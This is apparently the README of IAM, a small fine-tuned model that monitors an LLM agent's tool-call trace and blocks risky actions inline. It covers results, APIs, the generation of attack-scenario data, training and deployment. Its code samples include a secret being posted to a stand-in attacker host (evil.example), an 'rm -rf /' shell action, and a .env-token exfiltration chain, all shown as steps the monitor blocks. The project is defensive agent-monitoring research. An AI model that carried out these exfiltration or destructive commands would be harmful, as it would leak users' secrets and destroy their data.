# IAM — Inline Agent Monitor

> *I am watching.*

**A small, self-supervised model that watches an LLM agent's tool-call trace and stops the risky action _before_ it runs.** IAM (**I**nline **A**gent **M**onitor) rides inside the agent's execution loop and returns a per-step `OK` / `STOP` verdict on the *next* tool call — an inline guard, not a post-hoc judge.

[![CI](https://github.com/SongNY/IAM-InlineAgentMonitor/actions/workflows/ci.yml/badge.svg)](https://github.com/SongNY/IAM-InlineAgentMonitor/actions/workflows/ci.yml)
[![License: Apache 2.0](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)
[![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue.svg)](https://www.python.org/downloads/)

IAM is a ~2.2B-parameter fine-tuned LM (base: **Qwen3.5-2B**, full fine-tune,
Apache 2.0) that runs *inside* an agent's execution loop. Before each tool dispatch it
sees the trace so far plus the proposed next action and emits a per-step verdict —
`OK` / `WARN` / `STOP` — so the executor can block the harmful step in time.

The canonical example: *Read `.env` → grep `TOKEN` → `WebFetch` to an external host*
gets a `STOP` at the `WebFetch`, before any secret leaves the machine.

| What | Where |
|---|---|
| Package | `pip install agent-iam` (light import; no torch needed for the schema/tokenizer) |
| Model | `huggingface.co/Sunnyu/IAM-Qwen3.5-2B` (base: Qwen3.5-2B, ~2.2B params, Apache 2.0) |
| Data | `huggingface.co/datasets/<HF_USER>/agent-iam-traces` |
| Paper | arXiv:TBD |

> Status: research preview (`0.1.0a0`, alpha). The model is published; the dataset and
> paper links are placeholders until their public release.

## Why online mid-trace intervention?

Most agent guardrails act at the wrong time or with the wrong information:

- **Output filters** (Llama Guard, WildGuard) judge the *final* response. By the time
  they see it, the agent has already deleted the files, sent the email, or exfiltrated
  the secret. Side effects are irreversible.
- **Post-hoc LLM-as-judge** graders evaluate a completed transcript — useful for offline
  scoring, useless for stopping the action in flight.
- **Policy-rule systems** (ShieldAgent, AgentArmor) need an explicit rule or tool tag for
  every threat, so zero-day patterns slip through.

IAM instead learns the **distribution of normal agent behavior** and is supervised
to make a STOP/OK decision **at every decision step**, the same points where it runs in
deployment. It intervenes mid-trace, on the proposed action, before the side effect
happens — and because the signal is distributional rather than rule-based, it generalizes
to attack patterns it was never explicitly told about.

The core abstraction is a framework-agnostic canonical `Trajectory`: training-data
backends (Claude Code, LangGraph, OpenHands, OpenAI ReAct) and runtime adapters both
produce and consume the *same* `Trajectory` schema, so the model trains once and runs
against any framework.

## Results (preliminary, v0.19)

Evaluated on a held-out set of **269 traces (130 attacks / 139 benign)**, no scenario
leakage across splits. Primary metric is **Prevention Rate at a False Stop Rate ≤ 1%**
(PR@FSR=1%): "if 100 normal agent runs may produce at most 1 false stop, what fraction of
attacks did we prevent in time?"

| Scorer | PR @ FSR=1% | AUROC |
|---|---:|---:|
| **IAM-2B** (verdict head) | **≈ 0.89** | **≈ 0.997** |
| Keyword baseline | ≈ 0.115 | — |
| Action-span perplexity baseline | ≈ 0.08 | — |

> These numbers are preliminary and from the v0.19 baseline; expect them to move as the
> dataset and training recipe evolve. Reproduce them with the eval harness
> (`agent_iam.eval`, see below).

## What we learned (v0.19)

A few findings shaped the design and are worth stating up front:

- **Dense per-step supervision is what controls false stops.** Supervising an `OK` verdict
  after *every* decision step — not just `STOP` at the anomaly — teaches the model to say
  "do **not** stop here" as strongly as "stop here." This is the lever that pushed in-trace
  over-flagging down to ≈2–3%.
- **STOP up-weighting moves prevention off the floor.** The dense layout is ~7:1 `OK`:`STOP`;
  without up-weighting the STOP token (`W_STOP=8`) the model collapses to "never stop."
- **The residual false stops are concentrated in one source.** Benign false-stop rate is
  ≈2.2% overall but ≈6.5% on ATBench and ≈0% everywhere else (Claude Code, LangGraph, MRT,
  OpenAI-ReAct). A handful of ATBench benign traces fire at high `p_stop`, and they are what
  cap PR@FSR=1% at ≈0.89 — fixing them is the single highest-leverage next step.
- **Measure at the operating point, not by AUROC.** AUROC is ≈0.997 and flatters the model;
  the deployment-relevant number is PR@FSR=1%. Mind the threshold grid too: scoring
  `p_stop ∈ [0,1]` on a coarse perplexity-scale grid silently reports PR@FSR=1% as `0` — the
  sweep must be a fine `[0,1]` grid.
- **Shaped attacks are easy; subtle ones are the frontier.** Per-family prevention is ≈1.0
  for exfiltration / email / SSRF / shell / persistence / indirect-injection, and weaker on
  ATBench / MCP / DNS-exfil — the semantically subtle cases.
- **A guard complements alignment; it doesn't replace it.** A production-aligned backend
  refused 0/65 common attacks in our red-team probing; IAM's value is for the large fraction
  of agents on *weakly-aligned* backends, where the same attacks land. We treat attack
  success as a 2-D phenomenon (attacker goal × victim alignment); see `PAPER_FINDINGS.md`
  (F1–F8).

## Install

```bash
# from PyPI (once published)
pip install agent-iam

# from source, for development (tests + eval extras)
git clone https://github.com/SongNY/IAM-InlineAgentMonitor
cd IAM-InlineAgentMonitor
pip install -e ".[dev,eval]"
```

`import agent_iam` is intentionally light: the schema (`Trajectory`, `Verdict`, the
ATBench-compatible label space) and the `TraceTokenizer` import without `torch`. The
`TraceMonitor` inference class is lazy-loaded, so torch/transformers are only required
when you actually run a model.

Optional dependency extras:

| Extra | Pulls in | For |
|---|---|---|
| `train` | peft, trl, bitsandbytes, accelerate | fine-tuning |
| `eval` | scikit-learn, matplotlib | the eval harness + report plots |
| `runtime` | fastapi, uvicorn | the `iam serve` HTTP sidecar |
| `dev` | pytest, ruff, ipykernel | development |
| `all` | everything above | one-shot full install |

```bash
pip install -e ".[all]"
```

## Quickstart — inference

### One line — guard a live agent (GPU)

```python
import agent_iam

# Loads IAM-2B (GPU autodetected) once, then gates every tool call before it runs.
tools = agent_iam.guard(tools)        # a dict {name: fn}, a list, or a single callable

from agent_iam import IAMBlocked
try:
    tools["http_post"]("https://evil.example/x", data=secret)   # checked before sending
except IAMBlocked as e:
    print("blocked:", e.verdict.risk_type, "—", e.verdict.explanation)
```

The model is loaded once and cached across calls. Override defaults with
`agent_iam.guard(tools, model=..., threshold=..., device="cuda")` (defaults:
`Sunnyu/IAM-Qwen3.5-2B`, `0.5`, autodetect). This works with any framework whose tools are
Python callables — OpenAI function-calling, AutoGen, CrewAI, a custom ReAct loop, MCP. For
finer control, drop down to `TraceMonitor` / `StreamingMonitor` / a framework adapter below.

### `TraceMonitor` (one-shot check)

```python
from agent_iam import TraceMonitor, Trajectory

monitor = TraceMonitor.from_pretrained("Sunnyu/IAM-Qwen3.5-2B", threshold=0.5)

# `trace_so_far` is a canonical Trajectory (the steps already executed).
verdict = monitor.check(
    trace_so_far,                         # Trajectory
    next_action={"tool": "WebFetch", "args": {"url": "https://evil.example/x"}},
)
if verdict.block:                          # verdict.symbol == "STOP"
    raise RuntimeError(f"{verdict.risk_type}: {verdict.explanation}")
```

`check()` reads the verdict head's `P(STOP)` from the next-token logits in the dense
per-step layout the model was trained on, and only decodes a `<type>`/`<reason>`
explanation when STOP crosses the threshold. The returned `Verdict` carries `symbol`,
`risk_type`, `explanation`, `p_stop`, `threshold`, and `next_action_repr`.

### `StreamingMonitor` (agent-loop API)

For agents that emit observations and actions incrementally, the streaming monitor keeps
the running trace for you:

```python
from agent_iam import TraceMonitor
from agent_iam.runtime.stream import StreamingMonitor

# StreamingMonitor wraps any object with a `.check(trace, action) -> Verdict`,
# so hand it a TraceMonitor (or a stub in tests).
mon = StreamingMonitor(
    TraceMonitor.from_pretrained("Sunnyu/IAM-Qwen3.5-2B"),
    task_instruction="summarize the repo",
)

mon.observe(role="user", content="summarize the repo")     # context the model should see
verdict = mon.guard({"tool": "Bash", "args": {"cmd": "rm -rf /"}})   # judge BEFORE running
if verdict.block:
    raise RuntimeError(verdict.explanation)
mon.commit(action={"tool": "Bash", "args": {"cmd": "ls"}}, observation="...")  # what actually ran
```

> `StreamingMonitor` lives in `agent_iam/runtime/stream.py`. `guard` only checks (it does
> not mutate the trace); `commit` records the action you actually executed. See its
> docstring for the full `observe` / `guard` / `commit` contract.

### CLI

```bash
# Scan every trajectory in a JSONL file and print non-OK verdicts as JSON lines.
iam scan path/to/traces.jsonl --model Sunnyu/IAM-Qwen3.5-2B

# Run as a sidecar HTTP service exposing POST /check (requires the `runtime` extra).
iam serve --host 127.0.0.1 --port 8788 --model Sunnyu/IAM-Qwen3.5-2B
```

### Framework adapters

`agent_iam.runtime.adapters` hooks the monitor into a live framework. Each adapter
accumulates the running trace as a canonical `Trajectory` and gates each proposed tool
call through `monitor.check(...)`.

**Any framework — `GenericAdapter`.** OpenAI function-calling, AutoGen, CrewAI, a custom
ReAct loop, or an MCP server all ultimately *call a Python tool function*. Wrap those
functions and every call is gated before it runs (a STOP raises `IAMBlocked`):

```python
from agent_iam.runtime.adapters import GenericAdapter, IAMBlocked

iam = GenericAdapter(monitor)
iam.begin_session("s1", task_instruction="summarize ./poisoned.md")

tools = iam.wrap({"read": read_file, "http_post": http_post}, session_id="s1")
try:
    tools["http_post"]("https://evil.example/x", data=secret)   # blocked before sending
except IAMBlocked as e:
    print(e.verdict.risk_type, e.verdict.explanation)
```

**Opinionated frameworks** get a one-liner that installs the interceptor for you:

```python
from agent_iam.runtime.adapters import get_adapter

adapter = get_adapter("langgraph", monitor)   # or "claude_code", "generic"
graph = adapter.wrap(compiled_graph)           # installs a pre-tool interceptor
```

## Data generation pipeline

IAM's primary training signal is self-generated: real agent frameworks are driven
through adversarial and benign scenarios, and an auto-labeler marks the anomaly step. The
pipeline is four stages.

**1. (Optional) synthesize new attack scenarios.** Let a strong model draft new scenarios
in the existing library's format:

```bash
python scripts/synthesize_scenarios.py \
    --category shell_injection \
    --n 8 \
    --out agent_iam/data/generate/scenarios/shell_injection_auto.py
```

**2. Generate traces.** Drive an agent backend through the scenario library and capture
labeled trajectories:

```bash
# run scenarios through a backend, one run dir per run
python scripts/generate_traces.py \
    --out runs \
    --runs-per-scenario 2 \
    --backend claude_code \
    --model haiku

# only run scenarios whose id starts with a given prefix
python scripts/generate_traces.py --only iif-,exfil- --runs-per-scenario 3

# collect existing run dirs into one JSONL (one trajectory per line)
python scripts/generate_traces.py --collect runs --out-jsonl train.jsonl
```

Backends: `claude_code`, `openhands`, `langgraph`, `openai_react`. You can also pull
external sources into the same run-dir layout:

```bash
python scripts/pull_atbench.py --out runs-atbench/ --limit 1000   # ATBench (Apache 2.0)
python scripts/pull_mrt.py     --task-pairs 30 --per-pair 6 --out runs-mrt/   # Scale AI MRT
python scripts/pull_history.py --out runs-history/ --window 16 --stride 12    # benign Claude Code history
```

**3. Build the dataset.** Dedupe by content hash and split train/val/test with no
scenario leakage across splits:

```bash
python scripts/build_dataset.py \
    --include runs runs-atbench runs-mrt \
    --out data/v0.1/ \
    --val 0.15 --test 0.15 --seed 42
```

This writes `train.jsonl` / `val.jsonl` / `test.jsonl` plus `scenario_splits.json`.

**4. Tokenize.** Render each canonical `Trajectory` into `{input_ids, labels}` for the
trainer. Per-step verdict labels are derived inside `encode_for_training` from the trace's
anomaly label (the dense layout), so no verdicts are passed in:

```bash
python scripts/tokenize_dataset.py \
    --in  data/v0.1/train.jsonl \
    --out data/v0.1/train.tokenized.jsonl \
    --tokenizer Qwen/Qwen3.5-2B \
    --max-length 4096
```

To run training on Kaggle, `scripts/build_kaggle_bundle.py` packages the wheel + tokenized
JSONL into two uploadable zips (`dist/agent-iam-src.zip`, `dist/agent-iam-data.zip`).

See `examples/generate_data.py` for a copy-pasteable walkthrough.

## Training

Training runs as a Kaggle notebook: `notebooks/train_kaggle3.ipynb` (v0.19).

- **Base model:** Qwen3.5-2B (~2.2B params), Apache 2.0, loaded from an Unsloth-prepared
  checkpoint. **Full-parameter fine-tune** (no LoRA), max sequence length 4096.
- **Objectives:** (a) self-supervised next-action LM on `<action>` spans, and (b) supervised
  verdict generation in a **dense per-step layout** — a verdict slot after *every* decision
  step (OK for safe steps, STOP + `<type>` + `<reason>` at the anomaly step). This teaches
  the model "don't stop here" as well as "stop here," which is what fixes over-flagging.
- **STOP up-weighting:** the STOP symbol token's loss is up-weighted (`W_STOP = 8.0`) to
  counter the heavy OK/STOP class imbalance in the dense supervision.
- **Selection:** trained for several epochs; the best epoch is chosen by **PR@FSR=1%** on
  the held-out split.

The notebook exports a full-precision merged model under
`/kaggle/working/submission_model/` (and `submission_model_best/`), ready to push to the
Hugging Face Hub.

## Evaluation

The `agent_iam.eval` package replays test traces through a scorer and renders a report.
Metrics are framed around deployment semantics — **Prevention Rate** (flag at or before
the anomaly step, in time to block) and **False Stop Rate** (any flag on a benign trace) —
with PR@FSR as the headline operating point and AUROC / F1 as reference numbers.

The eval pipeline is exposed as two steps (`score`, then `report`) in
`agent_iam.eval.cli`. The `score` step writes per-trace scores; `report` consumes one or
more `scores.jsonl` files and emits `report.md`, `slices.csv`, and a `pr_fsr.png` plot.

```python
from agent_iam.eval.runner import verdict_scorer, run_split
from agent_iam.eval.baselines import keyword_scorer
from agent_iam.eval.report import build_report
from agent_iam.detect.online import TraceMonitor

# 1. score the model + a baseline
monitor = TraceMonitor.from_pretrained("Sunnyu/IAM-Qwen3.5-2B")
run_split(verdict_scorer(monitor), "data/v0.1/test.jsonl", "runs-eval/agent_iam/scores.jsonl")
run_split(keyword_scorer(),        "data/v0.1/test.jsonl", "runs-eval/keyword/scores.jsonl")

# 2. build the comparison report
build_report(
    ["runs-eval/agent_iam/scores.jsonl", "runs-eval/keyword/scores.jsonl"],
    out_dir="runs-eval/report/",
    names=["agent_iam", "keyword"],
)
```

Available scorers: `verdict_scorer` / `monitor_scorer` (`agent_iam.eval.runner`), and the
`keyword_scorer` / `untrained_lm_scorer` baselines (`agent_iam.eval.baselines`). See
`examples/run_eval.py` for a runnable version.

## Model & data

Public artifacts (placeholders until release):

- Model: `https://huggingface.co/Sunnyu/IAM-Qwen3.5-2B`
- Dataset: `https://huggingface.co/datasets/<HF_USER>/agent-iam-traces`

A helper at `scripts/upload_to_hf.py` pushes the trained checkpoint and dataset to the Hub.
The label space follows ATBench (AI45Research/ATBench, Apache 2.0): risk source × failure
mode × harm category. Each external data source retains its original license.

## Deployment & latency

IAM runs **one forward pass per proposed action** to read `P(STOP)` from the next-token
logits over `{OK, WARN, STOP}` — no text is generated on the common `OK` path; a `<reason>`
is decoded only when a STOP fires. Cost is therefore a single prefill over the recent
(left-truncated ≤4096-token) trace window. Since an agent's own per-step cost (the
policy-LLM call + tool I/O) is already 100 ms–seconds, a guard that adds tens of
milliseconds is imperceptible.

**GPU sizing** (2B in bf16 ≈ 4.5 GB of weights; ~6–8 GB with a 4k-token KV/activation
window):

| Tier | Example GPUs | VRAM | ~per-action (OK path) |
|---|---|---:|---:|
| Comfortable | A100 / H100 / L40S / RTX 4090 | ≥24 GB | ~5–15 ms |
| Recommended (sidecar) | L4 / A10 / RTX 3090 / 4080 | 16–24 GB | ~10–30 ms |
| Minimum (bf16) | T4 / RTX 3060 12 GB / RTX 4060 | 8–16 GB | ~30–120 ms |
| Quantized int4 (edge / CPU) | 6–8 GB GPUs, or CPU | ~2 GB | GPU tens of ms; CPU ~0.2–1 s |

So **any ≥16 GB GPU (L4 / A10 / 4090) gives no perceptible latency**; an 8 GB card still
runs bf16; int4 (GGUF / bitsandbytes) puts it on edge boxes or CPU, where ~sub-second is
still under a typical tool round-trip. These are estimates pending a measured benchmark.

> Roadmap optimization: the streaming path currently recomputes the trace prefix each step.
> **KV-cache reuse** — cache the committed prefix, forward only the newly proposed action —
> makes per-step cost ~constant regardless of session length, the main lever for long runs.

## Repo layout

```
agent_iam/
  __init__.py            # light public API (schema + tokenizer; TraceMonitor lazy-loaded)
  schema.py              # Trajectory / TraceStep / Verdict + ATBench-compatible label space
  tokenize.py            # canonical trace -> token stream; dense per-step verdict supervision
  cli.py                 # `iam` console entry point (scan, serve)
  detect/online.py       # TraceMonitor: from_pretrained, check, verdict_at, ppl_score
  eval/                  # eval harness: metrics, runner, baselines, report, cli
  runtime/
    stream.py            # StreamingMonitor (observe / guard / commit agent-loop API)
    adapters/            # framework adapters: generic (any tool callable), claude_code, langgraph
  data/                  # source loaders (atbench, mrt, claude_history) + generate/ pipeline
scripts/                 # data-gen & dataset-build pipeline + HF/Kaggle packaging
notebooks/               # Kaggle full-FT training notebook (train_kaggle3.ipynb)
examples/                # runnable-shaped examples (eval, data generation)
tests/                   # unit tests (canonical rendering, eval metrics)
```

## Citation

```bibtex
@misc{iam2026,
  title  = {IAM: Online Mid-Trace Anomaly Detection for LLM Agents at Sub-2B Scale},
  author = {The IAM Authors},
  year   = {2026},
  note   = {arXiv:TBD}
}
```

## License

Apache 2.0 — see [LICENSE](LICENSE). Copyright 2026 The IAM Authors. The training data is
a derivative dataset; each external component retains its original license.
